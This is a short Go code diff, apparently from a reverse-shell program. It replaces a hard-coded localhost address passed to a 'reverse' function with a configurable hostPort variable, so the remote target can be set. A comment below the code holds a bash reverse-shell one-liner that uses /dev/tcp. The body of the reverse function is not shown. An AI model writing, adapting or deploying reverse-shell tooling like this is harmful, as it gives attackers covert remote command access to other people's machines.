@@ -11,8 +11,10 @@ import (
 	"time"
 )
 
+var hostPort string
+
 func main() {
-	reverse("127.0.0.1:12345")
+	reverse(hostPort)
 }
 
 // bash -i >& /dev/tcp/localhost/12345 0>&1
